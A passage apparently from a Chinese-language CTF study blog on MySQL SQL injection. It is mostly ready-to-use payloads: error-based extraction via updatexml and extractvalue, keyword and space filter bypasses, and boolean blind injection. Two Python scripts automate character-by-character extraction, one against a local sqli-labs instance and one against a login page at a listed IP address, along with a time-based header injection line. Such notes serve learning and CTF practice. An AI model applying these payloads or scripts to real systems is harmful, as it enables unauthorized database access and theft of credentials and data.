updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),1)--+ </span></span><br><span class="line"><span class="string">爆数据库名  security</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1"</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+  爆表名  users</span></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 5,1),0x7e),1)--+  爆列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1"</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> security.users <span class="keyword">limit</span> <span class="number">7</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">sql</span>注入进阶<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`sql</span></span><br><span class="line"><span class="string">-1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),0) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag')),0) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1' and updatexml(1,concat(0x7e,(select group_concat(flag) from flag)),0) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1' and updatexml(1,concat(0x7e,right((select group_concat(flag) from flag),20)),0) #</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span></span><br></pre></td></tr></table></figure>

<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，<br>文中为Doc 1<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解<br>Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的<br>数据<br>作用：改变文档中符合条件的节点的值</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">' or updatexml(1,concat(0x7e,(version())),0) or'</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'1'' and password='</span>   <span class="keyword">or</span> <span class="string">'1  '</span>;</span><br><span class="line"></span><br><span class="line">id=1 and updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'1'</span> <span class="keyword">and</span> updatexml<span class="comment">/*' and password='*/</span>(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">'1'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username=<span class="number">1</span>  <span class="string">' and updatexml/*  &amp;password=   */(1,concat(0x7e,(SELECT database()),0x7e),1) or '</span><span class="number">1</span>     <span class="comment">/* */</span>注释掉<span class="keyword">password</span></span><br><span class="line">&lt;br&gt;XPATH syntax <span class="keyword">error</span>: <span class="string">'~error_based_hpf~'</span></span><br><span class="line"></span><br><span class="line">username=<span class="number">1</span>  <span class="string">' and updatexml/*  &amp;password=   */(1,concat(0x7e,(SELECT group_concat(table_name) from information_schema.tables where !(table_schema&lt;&gt;'</span>error_based_hpf<span class="string">') ),0x7e),3)or'</span><span class="number">1</span>     当过滤掉=时用!(table_schema&lt;&gt;<span class="string">'sth'</span>)</span><br><span class="line">&lt;br&gt;XPATH syntax <span class="keyword">error</span>: <span class="string">'~ffll44jj,users~'</span></span><br><span class="line"></span><br><span class="line">username=<span class="number">1</span>  <span class="string">' and updatexml/*  &amp;password=   */(1,concat(0x7e,(SELECT group_concat(column_name) from information_schema.columns where !(table_name&lt;&gt;'</span>ffll44jj<span class="string">') ),0x7e),3)or'</span><span class="number">1</span></span><br><span class="line">&lt;br&gt;XPATH syntax <span class="keyword">error</span>: <span class="string">'~value~'</span></span><br><span class="line"></span><br><span class="line">username=<span class="number">1</span>  <span class="string">' and updatexml/*  &amp;password=   */(1,concat(0x7e,(SELECT value from ffll44jj),0x7e),3)or'</span><span class="number">1</span></span><br><span class="line">&lt;br&gt;XPATH syntax <span class="keyword">error</span>: <span class="string">'~flag&#123;err0r_b4sed_sqli_+_hpf&#125;~'</span></span><br></pre></td></tr></table></figure>

<p>过滤了and union 与空格     首先肯定不能用union联合注入了   然后尝试报错盲注  使用^来代替and</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin'^updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">#     使用^来代替and</span></span><br><span class="line"><span class="keyword">admin</span><span class="string">'^updatexml(1,concat(0x7e，(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()),0x7e),1) #  每间隔一个完整的单词就要用括号括一个</span></span><br><span class="line"><span class="string">admin'</span>^updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,</span><br><span class="line">(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">"H4rDsq1"</span>)),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">#</span></span><br><span class="line"><span class="keyword">admin</span><span class="string">'^updatexml(1,concat(0x7e,</span></span><br><span class="line"><span class="string">(select(group_concat(password))from(H4rDsq1)),0x7e),1)#</span></span><br></pre></td></tr></table></figure>

<p>updatexml方法 暴力破解</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sername&#x3D;%00&#39; and updatexml(1,substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,41),1) #</span><br><span class="line"></span><br><span class="line">sername&#x3D;%00&#39; and updatexml(1,substr((select flag from flag),1,41),1) #</span><br></pre></td></tr></table></figure>

<h4 id="EXTRACTVALUE"><a href="#EXTRACTVALUE" class="headerlink" title="EXTRACTVALUE"></a>EXTRACTVALUE</h4><p>(XML_document, XPath_string);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，<br>文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串).<br>作用：从目标XML中返回包含所查询值的字符串</p>
<p><code>and extractvalue(1, payload)</code><br><code>and extractvalue(1, concat(0x7e,(select @@version),0x7e))</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(&#39;string&#39;) ord(&#39;string&#39;) 获得字符串第一个字符的ASCII码 char(ascii) 返回ASCII指向的字符</span><br></pre></td></tr></table></figure>

<ul>
<li><code>ascii(mid(&#39;string&#39;from(n))) 这样就可以，每次取第一个字符的ASCII码</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex(&#39;string&#39;) unhex(&#39;hex&#39;) 十六进制操作，注意没有0x bin()</span><br></pre></td></tr></table></figure>

<ul>
<li><code>select 0x.........</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">left(&#39;string&#39;,n) right(&#39;string&#39;,n) &#x2F;&#x2F;从左边（右边）开始截取n个字符</span><br><span class="line">mid(&#39;string&#39;,start[,length]) substr(&#39;string&#39;,start[,length]) &#x2F;&#x2F;截取字符串，位置从1开始</span><br></pre></td></tr></table></figure>

<ul>
<li>当逗号被过滤时：<code>mid(&#39;string&#39; from start for lenth)</code></li>
<li>当空格和for被过滤时：<code>mid((&#39;string&#39;)from(start)) EG:mid((&#39;string&#39;)from(3)) =&gt;ring</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lpad(&#39;str&#39;,length,pad) rpad() 填充字符串，当mid() substr()被过滤时使用</span><br></pre></td></tr></table></figure>

<ul>
<li>意思是：在 str 左边填充 pad，字符串总长度长度为 length。EG：<code>lpad(&#39;string&#39;,10,&#39;1&#39;) =&gt; 111111root</code></li>
<li>利用： <code>lpad(&#39;string&#39;,1,1)</code> =&gt; s</li>
</ul>
<ul>
<li><code>select 1-a(); 当前库名</code></li>
</ul>
<table>
<thead>
<tr>
<th>1.floor()select * from test where id=1 and (select 1 from (select  count(<em>),concat(user(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928204840594-1429421338.png" alt="img">)2.extractvalue()select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205421297-407989251.png" alt="img">)3.updatexml()select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205451969-1920882857.png" alt="img">)4.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205719485-521701933.png" alt="img">)5.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205942266-563740245.png" alt="img">)6.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205828281-760176387.png" alt="img">)7.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210038094-1420034123.png" alt="img">)8.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210144438-1099086559.png" alt="img">)9.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210420750-344279412.png" alt="img">)10.exp()select * from test where id=1 and exp(~(select * from(select user())a));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210533313-2028104812.png" alt="img"></th>
</tr>
</thead>
<tbody><tr>
<td></td>
</tr>
</tbody></table>
<h4 id="mssql报错注入"><a href="#mssql报错注入" class="headerlink" title="mssql报错注入"></a>mssql报错注入</h4><p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/clip_image002-1595815350664.jpg" alt="img"></p>
<h3 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">布尔盲注</span><br><span class="line"></span><br><span class="line">猜解数据库名长度</span><br><span class="line">?id=1'and length(database())=8<span class="comment">--+   看一下数据库名长度  如果正确页面有回显 =7就回显为空白   </span></span><br><span class="line">猜解数据库名的值</span><br><span class="line">?id=1'and left(database(),1)='s'<span class="comment">--+数据库名第一位是否为s</span></span><br><span class="line">or  ASCII 二分法 </span><br><span class="line">?id=1’ and ascii(substr(database(),1,1))&gt;97 # </span><br><span class="line">一个个找，然后就能够猜出完整的库名 dvwa</span><br><span class="line"></span><br><span class="line">?id=1'and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span><span class="comment">--+  爆表名，第一位ascii作比较</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;80--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆破当前表名</span></span><br><span class="line"><span class="string">首先猜测表的数量 </span></span><br><span class="line"><span class="string">输入 </span></span><br><span class="line"><span class="string">1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=1 # </span></span><br><span class="line"><span class="string">然后挨个试，发现《替换 = 1 中的 1 为 1,2,3,4,5，…》2 可行。 </span></span><br><span class="line"><span class="string">接下来猜表名的长度</span></span><br><span class="line"><span class="string">1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # </span></span><br><span class="line"><span class="string">替换 = 1 中的 1 为 1,2,3,4,5,… 发现 9 可行。 </span></span><br><span class="line"><span class="string">所以长度是 9 </span></span><br><span class="line"><span class="string">1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # </span></span><br><span class="line"><span class="string">又到了 ASCII 二分环节，然后找到了第一个表名 gusetbook </span></span><br><span class="line"><span class="string">之后把 limit 后面的那个 1 换成 2 ，再来一遍，找到第二个表名 users </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆破字段数：根据指定数据库 - 数据表，尝试猜测表中的字段个数，当 [猜测值 = 实际值] 时，页面会正常显示内容；当 [猜测值≠实际值] 时，页面会返回为空记录 or 语法错误的提示</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">having</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> table_schema=<span class="string">'dvwa'</span> <span class="keyword">and</span> table_name=<span class="string">'users'</span>)=[字段数] <span class="comment">#</span></span><br><span class="line">首先猜解表中字段的数量 </span><br><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’)=<span class="number">1</span> <span class="comment"># </span></span><br><span class="line">一个个试，发现 <span class="number">8</span> 存在 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">接着挨个猜解字段名长度 </span><br><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> <span class="keyword">length</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span> <span class="comment"># </span></span><br><span class="line">一个个试发现有 <span class="number">7</span> 个字符串长度。</span><br><span class="line"><span class="keyword">ASCII</span> 二分环节</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">布尔盲注脚本</span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://127.0.0.1/sqli-labs-master/Less-5/?id="</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        payload1 = <span class="string">"1' and ascii(substr((select database() limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;--+"</span>.format(i,mid)<span class="comment">#security</span></span><br><span class="line">        payload2 = <span class="string">"1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;--+"</span>.format(i,mid)<span class="comment">#emails,referers,uagents,users</span></span><br><span class="line">        payload3 = <span class="string">"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),&#123;&#125;,1))&gt;&#123;&#125;--+"</span>.format(i,mid)</span><br><span class="line">        <span class="comment"># emails:id,email_id ,referers:id,referer,ip_address,uagents:id,uagent,ip_address,username ,users:id,username,password,username,passwd,sex,age,email,phone,id</span></span><br><span class="line">        payload4 = <span class="string">"1' and ascii(substr((select group_concat(username) from security.users),&#123;&#125;,1))&gt;&#123;&#125;--+"</span>.format(i,mid)</span><br><span class="line">        r = requests.get(url=url+payload4</span><br><span class="line">        <span class="comment"># print(payload1)</span></span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:    <span class="comment">#语句正确与否两个回显是不一样的   You are in</span></span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    <span class="comment"># print(low,mid,high)</span></span><br><span class="line">    flag += chr(low)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162612769.png" alt="image-20200724162612769"></p>
<p><img src="https://bkimg.cdn.bcebos.com/pic/e850352ac65c103880a07b53bc119313b17e8941?x-bce-process=image/watermark,image_d2F0ZXIvYmFpa2UxMTY=,g_7,xp_5,yp_5" alt="img"></p>
<h4 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h4><p><a href="http://218.197.154.9:10011/login.php#" target="_blank" rel="noopener">http://218.197.154.9:10011/login.php#</a></p>
<p>有回显 但回显的是查询的sql语句 页面上没有回显位 是盲注</p>
<p>第一步观察到 输入万能密码admin’ oorr 1=1#或admin’# 回显为</p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200726094605905.png" alt="image-20200726094605905"></p>
<p>错误输入则回显为</p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200726094636368.png" alt="image-20200726094636368"></p>
<p>两个不一样的回显 想到 盲注类型会给两个回显 可以作为跑脚本的判断条件</p>
<p>第二部观察到F12中登录页面和弹窗是返回在同一个php中的</p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200726094827654.png" alt="image-20200726094827654"></p>
<p>然后找到注入点username框和方法使用盲注之后 要进行fuzz测试 看一下waf过滤了哪些sql注入的关键词  看看双写绕过了哪些 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># Author peguin</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://218.197.154.9:10011/login.php"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>:<span class="string">'keep-alive'</span></span><br><span class="line">&#125;</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_,&#123;&#125;!@#$%^&amp;*()?~'</span>:</span><br><span class="line">        <span class="comment"># passwd = "1' oorr ascii(substr((selselectect database()),&#123;&#125;,1))=&#123;&#125;#".format(i,ord(j))#easy_sql1</span></span><br><span class="line">        passwd = <span class="string">"1' oorr ascii(substr((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))=&#123;&#125;#"</span>.format(i,ord(j))<span class="comment">#f1ag_y0u_wi1l_n3ver_kn0w,users</span></span><br><span class="line">        <span class="comment">#passwd = "1' oorr ascii(substr((selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='f1ag_y0u_wi1l_n3ver_kn0w'),&#123;&#125;,1))=&#123;&#125;#".format(i, ord(j))#f111114g</span></span><br><span class="line">        <span class="comment"># passwd = "1' oorr ascii(substr((seselectlect f111114g frfromom f1ag_y0u_wi1l_n3ver_kn0w),&#123;&#125;,1))=&#123;&#125;#".format(i, ord(j))</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'user'</span>:passwd,</span><br><span class="line">            <span class="string">'pass'</span>:<span class="string">'123'</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(passwd)</span></span><br><span class="line">        r = requests.post(url,data=data,headers=headers)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Login success!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            res += j</span><br><span class="line">            print(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h4 id="例子2-过滤-“-”-和空格"><a href="#例子2-过滤-“-”-和空格" class="headerlink" title="例子2 过滤 “,” 和空格"></a>例子2 过滤 “,” 和空格</h4><p>首先划重点，payload 的基本格式为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;12&#39;%(ascii(mid(user()from(-1)))&gt;101)%&#39;1&amp;passwd&#x3D;dddd</span><br></pre></td></tr></table></figure>

<p>数据库构造的 sql 语句为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE uname&#x3D;&#39;12&#39;%(ascii(mid((passwd)from(-1)))&gt;101)%&#39;1&#39;</span><br></pre></td></tr></table></figure>

<p>很奇怪，这条 sql 竟然执行了，下面详细分析这个神奇的 payload 的构成：<br> 首先分析 (ascii(mid((passwd)from(-1)))&gt;101) 这部分：<br> 从最里面看， passwd 是表中的字段名，然后是 mid((passwd)from(-1)) 这部分，<br> 首先说 mid 函数，用执行结果做解释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mid(&quot;abcdef&quot;,2,3)&#x3D;&quot;bcd&quot;</span><br><span class="line">mid(&quot;abcdef&quot;,2)&#x3D;&quot;bcdef&quot;</span><br><span class="line">mid(&quot;abcdef&quot;,-2)&#x3D;&quot;ef&quot;</span><br></pre></td></tr></table></figure>

<p>mid((passwd)from(-1)) 等价于 mid(passwd,-1), 即取 passwd 的最后一个字符，比如 passwd 的值为 “password”,mid((passwd)from(-1)) 的值即为’d’，mid((passwd)from(-2)) 的值即为’rd’，依次类推。<br> ascii(‘b’) 函数为’b’ 的 ascii 码的十进制值，ascii(‘ab’) 函数为’a’ 的 ascii 码的十进制值，即返回第一个字符的 ascii 码值，因此 (ascii(mid((passwd)from(-1)))&gt;101) 这部分，根据返回值是 true 或者 false, 可以判断最后一个字符的范围，通过修改 - 1 的值，来对 passwd 中的字符从后向前进行遍历判断，与其他 bool 注入相似.</p>
<p>接下来分析 <code>uname=&#39;12&#39;%(something)%&#39;1&#39;</code> 这部分，mysql 中，<code>true</code> 的值为 1，<code>false</code> 的值为 0, 因此 uname 的值可能为<code>&#39;12&#39;%1%&#39;1&#39;</code> 或者<code>&#39;12&#39;%0%&#39;1&#39;</code>，这里面 <code>%</code> 为取余运算，运算顺序从左到右，<code>&#39;12&#39;%0%&#39;1&#39;</code> 即 <code>(&#39;12&#39;%0)%&#39;1&#39;</code>，首先计算<code>&#39;12&#39;%0</code>, 计算时会将<code>&#39;12&#39;</code> 转换为数字，mysql 字符串转换为数字的过程与 php 相同，举例说明:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;1abcd&#39;&#x3D;1</span><br><span class="line">&#39;abcd&#39;&#x3D;0,即任意以非零开头的字符串与0相等</span><br></pre></td></tr></table></figure>

<p>因此<br> <code>(&#39;12&#39;%0)%&#39;1&#39;</code>=&gt; <code>(1%0)%1</code>=&gt;null<br> <code>(&#39;12&#39;%1)%&#39;1&#39;</code>=&gt; <code>(1%1)%1</code>=&gt;0<br> 当结果为 null 时，sql 语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE uname&#x3D;null</span><br></pre></td></tr></table></figure>

<p>查询结果为空，当结果为 0 时</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE uname&#x3D;0</span><br></pre></td></tr></table></figure>

<p>前面说了，0 与任何字符串的值相等，因此查询返回全部用户，即查询结果不为空.</p>
<h4 id="例子3-from-1-for-1的形式"><a href="#例子3-from-1-for-1的形式" class="headerlink" title="例子3 from 1 for  1的形式"></a>例子3 from 1 for  1的形式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substring((<span class="keyword">select</span> <span class="keyword">user</span>()) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)=<span class="string">'e'</span></span><br><span class="line"><span class="keyword">substring</span>((<span class="keyword">select</span>  <span class="keyword">user</span>()) <span class="keyword">from</span> <span class="number">-1</span>)=<span class="string">'t'</span></span><br></pre></td></tr></table></figure>

<p>爆破user()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-forwarded-for: 10.20.0.12&#39;+sleep(5) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p>pay找到两种 load就是写个脚本跑了：</p>
